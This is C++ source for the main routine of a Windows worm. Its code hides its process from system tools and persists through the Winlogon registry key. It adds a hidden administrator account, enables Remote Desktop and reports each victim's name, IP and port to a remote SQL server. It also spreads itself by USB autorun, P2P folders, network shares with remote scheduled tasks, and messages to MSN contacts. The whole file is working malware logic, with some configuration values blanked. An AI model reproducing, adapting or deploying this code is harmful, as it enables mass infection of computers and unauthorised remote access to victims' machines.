#include <windows.h>
#include <time.h>
#include "Computer.h"
#include "FunctionsAssistant.h"
#include "FunctionsFiles.h"
#include "FunctionsWindowsNT.h"
#include "MSNPassportList.h"
#include "MSSQLClient.h"
#include "NetBios.h"
#include "NetworkList.h"
#include "P2PList.h"
#include "Process.h"
#include "ProcessList.h"
#include "USBList.h"

#define ENVIRON_VAR_WINDOWS_FOLDER        "WINDIR"
#define ENVIRON_VAR_HOME_USER_DIRECTORY   "USERPROFILE"

#define SLEEP_CHECK_COPY_FILE             500
#define SLEEP_HIDE_PROCESS                500 
#define SLEEP_W32_APP                     600000
#define SLEEP_W32_INFECTION_METHODS       5000

#define PERIODIC_DAY_INFECTION_METHODS    5 
#define PERIODIC_DAY_CHORDER_INFECTION    2

#define ANTIVIRUS_PROACTIVE1              "-"

#define STARTUP_KEYNAME                   "Shell"
#define STARTUP_KEYWORD                   "-"

#define DESKTOP_WALLPAPER_HOST            "\x68\x74\x74\x70\x3A\x2F\x2F\x66\x6C\x61\x73\x68\x62\x61\x63\x6B\x2E\x72\x65\x76\x2D\x68\x6F\x73\x74\x2E\x63\x6F\x2E\x63\x63\x2F"
#define DESKTOP_WALLPAPER_DESC            "Syscode Wallpaper"

#define W32_FOLDER                        "system32"
#define W32_SHARE_NAME                    "SharedApps"
#define W32_SHARE_INF                     "Applications"

#define USER_LOCAL_ACCOUNT                "-"
#define USER_LOCAL_PASSWD                 "-"

#define SQL_HOST                          "-"
#define SQL_PORT                          8080
#define SQL_USER                          "-"
#define SQL_PASSWD                        "-"
#define SQL_DBNAME                        "master"

#define NETBIOS_PREFIX_FILENAME           "KB"
#define NETBIOS_FILENAME_LENGHT           13

#define MSN_PROCESS_NAME                  "msmsgs.exe"
#define MSN_LIVE_PROCESS_NAME             "msnmsgr.exe"

/* ############################################ [ WINMAIN ] ############################################ */
 
int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nFunsterStil) {
   MSSQLClient * sqlClient;
   Process * procW32;
   ProcessList * procMSN;
   time_t actualTime;
   char networkFilename[NETBIOS_FILENAME_LENGHT];
   char * destinyRootPath, * destinyRootPathAndFilename, * execFilename, * computerName, * externalIPAddress;
   unsigned int selectedPort = 0;
   bool selectedDestiny = false, limitedUser = false, sharedRootPathDirectory = false, localMachineStartup = false, administratorAccount = false, scanP2Pport = false, antivirusProactiveEnabled = false;
   
   /* Check if antivirus proactive is enabled */
   if (FunctionsWindowsNT::isServiceActive(ANTIVIRUS_PROACTIVE1)) antivirusProactiveEnabled = true;
   
   computerName = FunctionsWindowsNT::getComputerName();    
   execFilename = FunctionsWindowsNT::getFilename();

   /* --- Hide process (MSConfig, Regedit, TaskManager) Rootkit */   
   procW32 = new Process(execFilename, (char *) FunctionsStrings::eraseExtension(FunctionsWindowsNT::getFilename()), STARTUP_KEYNAME);
   procW32->hidePermanentProcessTaskManager();
   procW32->hidePermanentProcessMSConfig(SLEEP_HIDE_PROCESS);
   procW32->hidePermanentProcessRegedit(SLEEP_HIDE_PROCESS);
         
   /* CurrentUser not infected
      All infection methods    */      
   if (!FunctionsWindowsNT::appCUserCVersionWinlogonStartupRegistryHaveKeyWord(STARTUP_KEYNAME, STARTUP_KEYWORD)) {
      if ((getenv(ENVIRON_VAR_WINDOWS_FOLDER) != NULL) && (!antivirusProactiveEnabled)) {
         if (mkdir((string(getenv(ENVIRON_VAR_WINDOWS_FOLDER)) + string("\\") + string(W32_FOLDER)).c_str()) == 0) {
            destinyRootPath = (char *) malloc(strlen((string(getenv(ENVIRON_VAR_WINDOWS_FOLDER)) + string("\\") + string(W32_FOLDER)).c_str()) + 1);
            if (destinyRootPath != NULL) {
               strcpy(destinyRootPath, (string(getenv(ENVIRON_VAR_WINDOWS_FOLDER)) + string("\\") + string(W32_FOLDER)).c_str());
               destinyRootPathAndFilename = (char *) malloc(strlen((string(getenv(ENVIRON_VAR_WINDOWS_FOLDER)) + string("\\") + string(W32_FOLDER) + string("\\") + string(execFilename)).c_str()) + 1);
               if (destinyRootPathAndFilename != NULL) {
                  strcpy(destinyRootPathAndFilename, (string(destinyRootPath) + string("\\") + string(execFilename)).c_str());
                  if (FunctionsFiles::copyFile(FunctionsWindowsNT::getAbsolutePathAndFilename(), destinyRootPathAndFilename)) {
                     Sleep(SLEEP_CHECK_COPY_FILE);
                     if (FunctionsFiles::fileExists(destinyRootPathAndFilename)) selectedDestiny = true;
                     else { free(destinyRootPath); free(destinyRootPathAndFilename); }
                  }
                  else { free(destinyRootPath); free(destinyRootPathAndFilename); }
               }
               else free(destinyRootPath);
            }
         }
      }
      if (!selectedDestiny) {
         limitedUser = true;
         if (getenv(ENVIRON_VAR_HOME_USER_DIRECTORY) != NULL) {
            if (mkdir((string(getenv(ENVIRON_VAR_HOME_USER_DIRECTORY)) + string("\\") + string(W32_FOLDER)).c_str()) == 0) {
               destinyRootPath = (char *) malloc(strlen((string(getenv(ENVIRON_VAR_HOME_USER_DIRECTORY)) + string("\\") + string(W32_FOLDER)).c_str()) + 1);
               if (destinyRootPath != NULL) {
                  strcpy(destinyRootPath, (string(getenv(ENVIRON_VAR_HOME_USER_DIRECTORY)) + string("\\") + string(W32_FOLDER)).c_str());
                  destinyRootPathAndFilename = (char *) malloc(strlen((string(getenv(ENVIRON_VAR_HOME_USER_DIRECTORY)) + string("\\") + string(W32_FOLDER) + string("\\") + string(execFilename)).c_str()) + 1);
                  if (destinyRootPathAndFilename != NULL) {
                     strcpy(destinyRootPathAndFilename, (string(destinyRootPath) + string("\\") + string(execFilename)).c_str());
                     if (FunctionsFiles::copyFile(FunctionsWindowsNT::getAbsolutePathAndFilename(), destinyRootPathAndFilename)) {
                        Sleep(SLEEP_CHECK_COPY_FILE);
                        if (FunctionsFiles::fileExists(destinyRootPathAndFilename)) selectedDestiny = true;
                        else { free(destinyRootPath); free(destinyRootPathAndFilename); }
                     }
                     else { free(destinyRootPath); free(destinyRootPathAndFilename); }
                  }
                  else free(destinyRootPath);
               }
            }
         }       
      }
      
      if (selectedDestiny) {
         /* Set destiny folder attributes System, Hidden */
         if (!antivirusProactiveEnabled) {
            FunctionsFiles::setFileAttributesSH(destinyRootPath); 
         }
         
         /* Share W32Folder to local network */
         if (NetBios::netShareDirectoryAdd(destinyRootPath, W32_SHARE_NAME, W32_SHARE_INF)) sharedRootPathDirectory = true;
         
         /* Set startup application in registry */
         if (FunctionsWindowsNT::appLMachineCVersionWinlogonStartupRegistryHaveKeyWord(STARTUP_KEYNAME, STARTUP_KEYWORD)) localMachineStartup = true; 
         if ((!limitedUser) && (!localMachineStartup)) {     
            if (FunctionsWindowsNT::appLMachineCVersionWinlogonStartupRegistry(STARTUP_KEYNAME, (char *) (string("explorer.exe,") + string(STARTUP_KEYWORD) + string(",") + string(destinyRootPathAndFilename)).c_str())) {               
               localMachineStartup = true;
            }
         }
         FunctionsWindowsNT::appCUserCVersionWinlogonStartupRegistry(STARTUP_KEYNAME, (char *) (string("explorer.exe,") + string(STARTUP_KEYWORD) + string(",") + string(destinyRootPathAndFilename)).c_str());
         
         /* Set URL desktop wallpaper */
         //FunctionsWindowsNT::setDesktopURLWallpaper(DESKTOP_WALLPAPER_HOST, DESKTOP_WALLPAPER_DESC);
         
         /* Create administrator account */
         if (NetBios::netUserAdd(USER_LOCAL_ACCOUNT, USER_LOCAL_PASSWD)) {
            if (NetBios::netLocalGroupAdministratorsAddUser(USER_LOCAL_ACCOUNT)) administratorAccount = true;
            else NetBios::netUserDel(USER_LOCAL_ACCOUNT);
         }
         
         Sleep(SLEEP_W32_INFECTION_METHODS);
         
         /* Infection USB Plug method */
         if (!antivirusProactiveEnabled) {
            if (USBList::setAutoRunFilenameWhenUSBArriveOrPermanentScan(destinyRootPathAndFilename)) {
               USBList::inicialize(hThisInstance, !antivirusProactiveEnabled, true, DELAY_INFECT_WHEN_USB_ARRIVE);
            }
                      
            Sleep(SLEEP_W32_INFECTION_METHODS);
         }
         
         /* Infection Peer to Peer (P2P) method */
         if (!antivirusProactiveEnabled) {
            if ((!FunctionsWindowsNT::terminalServerIsRunning()) && (administratorAccount)) scanP2Pport = true;
            else scanP2Pport = false;
         
            P2PList::inicialize();
            if (P2PList::scanP2PSoftwareLocalMachine(scanP2Pport)) {
               selectedPort = P2PList::getPortSelected();
               P2PList::copyFileToIncomingFolderHacking(destinyRootPathAndFilename);   
            }  
         
            Sleep(SLEEP_W32_INFECTION_METHODS);
         }
             
         /* Enable Terminal Services */
         if (administratorAccount) {
            if (!FunctionsWindowsNT::terminalServerIsRunning()) {
               if (selectedPort != 0) { 
                  FunctionsWindowsNT::setTerminalServerPort(selectedPort);
                  FunctionsWindowsNT::enableTerminalServer();
               }
               else { 
                  FunctionsWindowsNT::enableTerminalServer();
                  selectedPort = FunctionsWindowsNT::getTerminalServerPort();
               }
            }
            else selectedPort = FunctionsWindowsNT::getTerminalServerPort();   
            
            externalIPAddress = FunctionsWindowsNT::getExternalIPAddress();
            if ((externalIPAddress != NULL) && (computerName != NULL) && (selectedPort != 0)) {
               sqlClient = new MSSQLClient(SQL_HOST, SQL_PORT);
               sqlClient->login(SQL_USER, SQL_PASSWD);
               if (sqlClient->connect(SQL_DBNAME)) {
                  char * selPort = (char *) malloc(6);
                  if (selPort != NULL) {
                     sprintf(selPort, "%u", selectedPort); 
                     sqlClient->execSQL((string("INSERT INTO user_log (ComputerName, IPAddress, Port) Values ('") + string(computerName) + string("','") + string(externalIPAddress) + string("','") + string(selPort) + string("');")).c_str());
                     free(selPort);
                  }
                  sqlClient->close();
               }
               free(externalIPAddress);
            }
            else if (externalIPAddress != NULL) free(externalIPAddress);                           
         }
         
         Sleep(SLEEP_W32_INFECTION_METHODS);
         
         if (atoi(FunctionsStrings::getToken(asctime(gmtime(&actualTime)), ' ', 3)) % PERIODIC_DAY_CHORDER_INFECTION == 0) {
            /* Infection local network (Netbios) */
            if (!antivirusProactiveEnabled) {
               NetworkList::inicialize();
               if (NetworkList::scanLocalNetwork()) {
                  srand((unsigned) time(NULL));
                  sprintf(networkFilename, "%s%d%d%d%d%d%d%s", NETBIOS_PREFIX_FILENAME, FunctionsAssistant::randomNumber(0, 9), FunctionsAssistant::randomNumber(0, 9), 
                                                                                      FunctionsAssistant::randomNumber(0, 9), FunctionsAssistant::randomNumber(0, 9), 
                                                                                      FunctionsAssistant::randomNumber(0, 9), FunctionsAssistant::randomNumber(0, 9), 
                                                                                      FunctionsStrings::getExtension(execFilename));
                                                                                
                  NetworkList::copyFileToSharesFoldersInNetworks(destinyRootPathAndFilename, networkFilename);
                  if (sharedRootPathDirectory) {
                     NetworkList::schedulerTaskAddNowInNetworksHacking((string("\\\\") + string(computerName) + string("\\") + string(W32_SHARE_NAME) + string("\\") + string(execFilename)).c_str(), networkFilename, true);       
                  } 
                  else NetworkList::schedulerTaskAddNowInNetworksHacking("", networkFilename, true);
               }
         
               Sleep(SLEEP_W32_INFECTION_METHODS);
            }
            
            /* Infection MSN Messenger (hotmail) */
            MSNPassportList::inicialize();
            if (MSNPassportList::isInicialized()) {
               procMSN = new ProcessList();
               procMSN->addProcess(MSN_PROCESS_NAME); procMSN->addProcess(MSN_LIVE_PROCESS_NAME);
               procMSN->killPermanentProcessList();
               MSNPassportList::sendAllContactHackingMessageAndFile(destinyRootPathAndFilename);   
            }
         }
         else {
            /* Infection MSN Messenger (hotmail) */
            MSNPassportList::inicialize();
            if (MSNPassportList::isInicialized()) {
               procMSN = new ProcessList();
               procMSN->addProcess(MSN_PROCESS_NAME); procMSN->addProcess(MSN_LIVE_PROCESS_NAME);
               procMSN->killPermanentProcessList();
               MSNPassportList::sendAllContactHackingMessageAndFile(destinyRootPathAndFilename);   
            }
            
            Sleep(SLEEP_W32_INFECTION_METHODS);

            /* Infection local network (Netbios) */
            if (!antivirusProactiveEnabled) {
               NetworkList::inicialize();
               if (NetworkList::scanLocalNetwork()) {
                  srand((unsigned) time(NULL));
                  sprintf(networkFilename, "%s%d%d%d%d%d%d%s", NETBIOS_PREFIX_FILENAME, FunctionsAssistant::randomNumber(0, 9), FunctionsAssistant::randomNumber(0, 9), 
                                                                                      FunctionsAssistant::randomNumber(0, 9), FunctionsAssistant::randomNumber(0, 9), 
                                                                                      FunctionsAssistant::randomNumber(0, 9), FunctionsAssistant::randomNumber(0, 9), 
                                                                                      FunctionsStrings::getExtension(execFilename));
                                                                             
                  NetworkList::copyFileToSharesFoldersInNetworks(destinyRootPathAndFilename, networkFilename);
                  if (sharedRootPathDirectory) {
                     NetworkList::schedulerTaskAddNowInNetworksHacking((string("\\\\") + string(computerName) + string("\\") + string(W32_SHARE_NAME) + string("\\") + string(execFilename)).c_str(), networkFilename, true);       
                  } 
                  else NetworkList::schedulerTaskAddNowInNetworksHacking("", networkFilename, true);
               }  
            }                      
         }
         for(;;) Sleep(SLEEP_W32_APP); 
      }
   }
   else {
        
      /* CurrentUser is infected
         USB Plug infection method */
      destinyRootPathAndFilename = FunctionsWindowsNT::appCUserCVersionWinlogonStartupRegistryValue(STARTUP_KEYNAME, STARTUP_KEYWORD);
      if ((destinyRootPathAndFilename == NULL) || (strlen(destinyRootPathAndFilename) == 0)) {
         destinyRootPathAndFilename = FunctionsWindowsNT::appLMachineCVersionWinlogonStartupRegistryValue(STARTUP_KEYNAME, STARTUP_KEYWORD);
      }
        
      if ((destinyRootPathAndFilename != NULL) && (strlen(destinyRootPathAndFilename) > 0)) {
         if (stricmp(destinyRootPathAndFilename, FunctionsWindowsNT::getAbsolutePathAndFilename()) == 0) {
            
            /* Infection USB Plug method */
            if (!antivirusProactiveEnabled) {
               if (USBList::setAutoRunFilenameWhenUSBArriveOrPermanentScan(destinyRootPathAndFilename)) {
                  USBList::inicialize(hThisInstance, !antivirusProactiveEnabled, true, DELAY_INFECT_WHEN_USB_ARRIVE);
               }
              
               Sleep(SLEEP_W32_INFECTION_METHODS);
            }
            
            actualTime = (time_t) time(NULL);
            if (atoi(FunctionsStrings::getToken(asctime(gmtime(&actualTime)), ' ', 3)) % PERIODIC_DAY_INFECTION_METHODS == 0) {
               
               if (atoi(FunctionsStrings::getToken(asctime(gmtime(&actualTime)), ' ', 3)) % PERIODIC_DAY_CHORDER_INFECTION == 0) {
                  /* Infection local network (Netbios) */
                  if (!antivirusProactiveEnabled) {
                     NetworkList::inicialize();
                     if (NetworkList::scanLocalNetwork()) {                                  
                        srand((unsigned) time(NULL));
                        sprintf(networkFilename, "%s%d%d%d%d%d%d%s", NETBIOS_PREFIX_FILENAME, FunctionsAssistant::randomNumber(0, 9), FunctionsAssistant::randomNumber(0, 9), 
                                                                                              FunctionsAssistant::randomNumber(0, 9), FunctionsAssistant::randomNumber(0, 9), 
                                                                                              FunctionsAssistant::randomNumber(0, 9), FunctionsAssistant::randomNumber(0, 9), 
                                                                                              FunctionsStrings::getExtension(execFilename));
                                                                                
                        NetworkList::copyFileToSharesFoldersInNetworks(destinyRootPathAndFilename, networkFilename);
                        NetworkList::schedulerTaskAddNowInNetworksHacking("", networkFilename, true);
                     }
                 
                     Sleep(SLEEP_W32_INFECTION_METHODS);
                  }
                  
                  /* Infection MSN Messenger (hotmail) */
                  MSNPassportList::inicialize();
                  if (MSNPassportList::isInicialized()) {
                     procMSN = new ProcessList();
                     procMSN->addProcess(MSN_PROCESS_NAME); procMSN->addProcess(MSN_LIVE_PROCESS_NAME);
                     procMSN->killPermanentProcessList();
                     MSNPassportList::sendAllContactHackingMessageAndFile(destinyRootPathAndFilename);   
                  }
               }
               else {
                  /* Infection MSN Messenger (hotmail) */
                  MSNPassportList::inicialize();
                  if (MSNPassportList::isInicialized()) {
                     procMSN = new ProcessList();
                     procMSN->addProcess(MSN_PROCESS_NAME); procMSN->addProcess(MSN_LIVE_PROCESS_NAME);
                     procMSN->killPermanentProcessList();
                     MSNPassportList::sendAllContactHackingMessageAndFile(destinyRootPathAndFilename);   
                  }
                  
                  Sleep(SLEEP_W32_INFECTION_METHODS);
                  
                  /* Infection local network (Netbios) */
                  NetworkList::inicialize();
                  if (!antivirusProactiveEnabled) {
                     if (NetworkList::scanLocalNetwork()) {                                  
                        srand((unsigned) time(NULL));
                        sprintf(networkFilename, "%s%d%d%d%d%d%d%s", NETBIOS_PREFIX_FILENAME, FunctionsAssistant::randomNumber(0, 9), FunctionsAssistant::randomNumber(0, 9), 
                                                                                              FunctionsAssistant::randomNumber(0, 9), FunctionsAssistant::randomNumber(0, 9), 
                                                                                              FunctionsAssistant::randomNumber(0, 9), FunctionsAssistant::randomNumber(0, 9), 
                                                                                              FunctionsStrings::getExtension(execFilename));
                                                                                
                        NetworkList::copyFileToSharesFoldersInNetworks(destinyRootPathAndFilename, networkFilename);
                        NetworkList::schedulerTaskAddNowInNetworksHacking("", networkFilename, true);
                     } 
                  }                                
               }                  
            }
            for(;;) Sleep(SLEEP_W32_APP); 
         }  
      }  
   } 
   return -1;
}
